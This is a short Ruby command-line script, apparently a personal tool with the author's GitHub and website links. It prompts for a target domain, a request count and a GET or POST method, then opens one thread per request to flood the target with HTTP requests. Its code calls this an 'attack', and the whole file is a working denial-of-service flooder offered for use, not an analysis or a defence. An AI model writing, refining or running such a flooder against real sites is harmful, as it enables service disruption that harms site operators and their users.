system("clear")
require "http"
require "thread"
require 'colorize'

puts "Berkay Küçük".green
puts ""
puts "https://github.com/bksec".green
puts "https://berkaykucuk.com.tr".green
sleep 3
system("clear")

puts "give me your domain (exp:http://bksec.xyz): ".blue.bold
domain = gets.chomp
puts "count:".blue.bold
count = gets.chomp 
puts "chose your type [post/get]".blue.bold
type = gets.chomp


def attack(domain,type)
if type == "post"
code = HTTP.post(domain).code
elsif type == "get" 
code = HTTP.get(domain).code
else
abort('not supported attack type')
end
puts "http code #{code}".red.bold
end


start = 0
stop  = count

threads = ("#{start}".."#{stop}").map do |int|  
  Thread.new do
    attack(domain,type) 
  end
end

threads.each(&:join)
